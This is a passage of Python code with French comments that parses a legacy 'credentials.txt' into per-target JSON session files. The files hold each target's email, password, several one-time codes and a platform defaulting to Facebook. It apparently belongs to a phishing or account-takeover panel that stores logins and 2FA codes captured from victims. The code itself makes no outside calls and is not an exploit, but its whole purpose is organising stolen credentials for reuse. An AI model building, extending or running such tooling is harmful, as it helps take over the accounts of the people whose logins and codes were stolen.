    result = {"migrated": 0, "skipped": 0, "errors": []}
    try:
        txt_path = "credentials.txt"
        if not os.path.exists(txt_path):
            return result

        # Lire le contenu — gérer le chiffrement
        try:
            with open(txt_path, "r", encoding="utf-8") as f:
                content = f.read()
        except Exception as e:
            result["errors"].append(f"lecture: {e}")
            return result

        # Si le fichier est chiffré, le déchiffrer
        try:
            from crypto import is_encrypted, decrypt_text
            if content.strip() and is_encrypted(content):
                content = decrypt_text(content)
        except Exception as e:
            result["errors"].append(f"dechiffrement: {e}")
            # Continuer avec le contenu brut, le parser échouera proprement

        # Pré-calcul : pour chaque cible, savoir si elle a déjà des sessions JSON
        # (sauf si force=True → on migre tout)
        existing_targets_with_sessions = set()
        if not force:
            for tid, cred_dir in _iter_all_cred_dirs():
                if glob.glob(os.path.join(cred_dir, "*.json")):
                    existing_targets_with_sessions.add(tid)

        # Parser le fichier ligne par ligne
        sessions_created = 0
        sessions_skipped = 0
        current = None  # session en cours de parsing

        def _flush(current):
            """Écrit la session courante sur disque si elle contient au moins un email/password.
            Retourne (created: int, skipped: int)."""
            nonlocal sessions_created, sessions_skipped
            if not current:
                return
            if not current.get("email") and not current.get("password"):
                return
            try:
                raw_target = current.get("target", "unknown")
                tid = _sanitize_target_id(raw_target)
                # Idempotence par cible
                if not force and tid in existing_targets_with_sessions:
                    sessions_skipped += 1
                    return
                cred_dir = _ensure_cred_dir(tid)
                safe_date = re.sub(r'[^0-9A-Za-z_\-]', '_',
                                   current.get("date", datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
                # Éviter les collisions de nom — ajouter un compteur
                fname = f"{safe_date}.json"
                fpath = os.path.join(cred_dir, fname)
                suffix = 1
                while os.path.exists(fpath):
                    fname = f"{safe_date}_{suffix}.json"
                    fpath = os.path.join(cred_dir, fname)
                    suffix += 1
                session = {
                    "target":          raw_target,
                    "date":            current.get("date", ""),
                    "platform":        current.get("platform", "facebook"),
                    "source_platform": current.get("source_platform", ""),
                    "email":           current.get("email", ""),
                    "password":        current.get("password", ""),
                    "otps":            current.get("otps", []),
                    "message_restore": [],  # Pas de code de restauration dans le legacy
                    "complete":        bool(current.get("email") and current.get("password")),
                }
                # Write encrypted
                try:
                    from crypto import write_json_encrypted
                    write_json_encrypted(fpath, session)
                except Exception as _mig_crypto_err:
                    _log("migrate_from_txt.crypto", _mig_crypto_err)
                    with open(fpath, "w", encoding="utf-8") as fw:
                        json.dump(session, fw, indent=4, ensure_ascii=False)
                sessions_created += 1
                # Marquer cette cible comme migrée pour éviter les doublons
                # si plusieurs blocs du même fichier la concernent
                existing_targets_with_sessions.add(tid)
            except Exception as e:
                result["errors"].append(f"_flush: {e}")
                _log("migrate_from_txt._flush", e)

        for raw_line in content.splitlines():
            line = raw_line.strip()
            # Détection d'un nouveau bloc
            if line.startswith("┌"):
                # Finaliser le bloc précédent
                if current:
                    _flush(current)
                current = {"email": "", "password": "", "otps": [], "platform": "facebook",
                           "source_platform": "", "target": "unknown", "date": ""}
                continue
            if line.startswith("└"):
                # Fin de bloc
                if current:
                    _flush(current)
                    current = None
                continue
            # Parser les lignes │  🎯 Cible : ... │  🕐 Date : ... etc.
            if not current:
                continue
            if "Cible" in line and ":" in line:
                val = line.split(":", 1)[1].strip().lstrip("│").strip()
                current["target"] = val
            elif "Date" in line and ":" in line:
                val = line.split(":", 1)[1].strip().lstrip("│").strip()
                current["date"] = val
            elif "Email" in line and ":" in line:
                val = line.split(":", 1)[1].strip().lstrip("│").strip()
                current["email"] = val
            elif "Password" in line and ":" in line:
                val = line.split(":", 1)[1].strip().lstrip("│").strip()
                current["password"] = val
            elif "Plateforme" in line and ":" in line:
                val = line.split(":", 1)[1].strip().lstrip("│").strip().lower()
                current["platform"] = val or "facebook"
            elif "Source" in line and ":" in line:
                val = line.split(":", 1)[1].strip().lstrip("│").strip().lower()
                current["source_platform"] = val
            elif "OTP" in line and ":" in line:
                # Extraire le label (OTP, OTP1, OTP2, OTP FINAL...) et la valeur
                parts = line.split(":", 1)
                if len(parts) == 2:
                    label_part = parts[0].strip().lstrip("│").strip()
                    value = parts[1].strip()
                    # Normaliser le label
                    label = "OTP"
                    m = re.search(r'OTP[\s\d]*(FINAL)?', label_part, re.IGNORECASE)
                    if m:
                        label = "OTP" + (" FINAL" if m.group(1) else "")
                        # Garder le numéro si présent
                        num_match = re.search(r'OTP\s*(\d+)', label_part, re.IGNORECASE)
                        if num_match and not m.group(1):
                            label = f"OTP{num_match.group(1)}"
                    current["otps"].append({"label": label, "value": value})

        # Finaliser le dernier bloc si le fichier ne se termine pas par └
        if current:
            _flush(current)

        result["migrated"] = sessions_created
        result["skipped"] = sessions_skipped
        return result
    except Exception as e:
        _log("migrate_from_txt", e)
        result["errors"].append(f"fatal: {e}")
        return result


def migrate_target_from_txt(target_id: str, force: bool = False) -> dict:
    """Migration ciblée : ne migre QUE les blocs de credentials.txt appartenant
    à la cible `target_id`. Utile pour un bouton « Migrer cette cible » dans l'UI.

    Args:
        target_id: nom de la cible à migrer
        force: si True, migre même si la cible a déjà des sessions

    Returns:
        dict: {"migrated": int, "errors": list[str]}
    """
    result = {"migrated": 0, "errors": []}
    try:
        txt_path = "credentials.txt"
        if not os.path.exists(txt_path):
            return result

        with open(txt_path, "r", encoding="utf-8") as f:
            content = f.read()

        # Déchiffrer si nécessaire
        try:
            from crypto import is_encrypted, decrypt_text
            if content.strip() and is_encrypted(content):
                content = decrypt_text(content)
        except Exception as e:
            result["errors"].append(f"dechiffrement: {e}")

        target_id_sanitized = _sanitize_target_id(target_id)
        current = None
        sessions_created = 0

        def _flush_if_match(current):
            nonlocal sessions_created
            if not current:
                return
            if not current.get("email") and not current.get("password"):
                return
            raw_target = current.get("target", "unknown")
            tid = _sanitize_target_id(raw_target)
            if tid != target_id_sanitized:
                return
            try:
                cred_dir = _ensure_cred_dir(tid)
                safe_date = re.sub(r'[^0-9A-Za-z_\-]', '_',
                                   current.get("date", datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
                fname = f"{safe_date}.json"
                fpath = os.path.join(cred_dir, fname)
                suffix = 1
                while os.path.exists(fpath):
                    fname = f"{safe_date}_{suffix}.json"
                    fpath = os.path.join(cred_dir, fname)
                    suffix += 1
                session = {
                    "target":          raw_target,
                    "date":            current.get("date", ""),
                    "platform":        current.get("platform", "facebook"),
                    "source_platform": current.get("source_platform", ""),
                    "email":           current.get("email", ""),
                    "password":        current.get("password", ""),
                    "otps":            current.get("otps", []),
                    "message_restore": [],  # Pas de code de restauration dans le legacy
                    "complete":        bool(current.get("email") and current.get("password")),
                }
                try:
                    from crypto import write_json_encrypted
                    write_json_encrypted(fpath, session)
                except Exception:
                    with open(fpath, "w", encoding="utf-8") as fw:
                        json.dump(session, fw, indent=4, ensure_ascii=False)
                sessions_created += 1
            except Exception as e:
                result["errors"].append(f"flush: {e}")

        for raw_line in content.splitlines():
            line = raw_line.strip()
            if line.startswith("┌"):
                if current:
                    _flush_if_match(current)
                current = {"email": "", "password": "", "otps": [], "platform": "facebook",
                           "source_platform": "", "target": "unknown", "date": ""}
                continue
            if line.startswith("└"):
                if current:
                    _flush_if_match(current)
                    current = None
                continue
            if not current:
                continue
            if "Cible" in line and ":" in line:
                current["target"] = line.split(":", 1)[1].strip().lstrip("│").strip()
            elif "Date" in line and ":" in line:
                current["date"] = line.split(":", 1)[1].strip().lstrip("│").strip()
            elif "Email" in line and ":" in line:
                current["email"] = line.split(":", 1)[1].strip().lstrip("│").strip()
            elif "Password" in line and ":" in line:
                current["password"] = line.split(":", 1)[1].strip().lstrip("│").strip()
            elif "Plateforme" in line and ":" in line:
                current["platform"] = line.split(":", 1)[1].strip().lstrip("│").strip().lower() or "facebook"
            elif "Source" in line and ":" in line:
                current["source_platform"] = line.split(":", 1)[1].strip().lstrip("│").strip().lower()
            elif "OTP" in line and ":" in line:
                parts = line.split(":", 1)
                if len(parts) == 2:
                    label_part = parts[0].strip().lstrip("│").strip()
                    value = parts[1].strip()
                    label = "OTP"
                    m = re.search(r'OTP[\s\d]*(FINAL)?', label_part, re.IGNORECASE)
                    if m:
                        label = "OTP" + (" FINAL" if m.group(1) else "")
                        num_match = re.search(r'OTP\s*(\d+)', label_part, re.IGNORECASE)
                        if num_match and not m.group(1):
                            label = f"OTP{num_match.group(1)}"
                    current["otps"].append({"label": label, "value": value})

        if current:
            _flush_if_match(current)

        result["migrated"] = sessions_created
        return result
    except Exception as e:
        _log("migrate_target_from_txt", e)
        result["errors"].append(f"fatal: {e}")
        return result
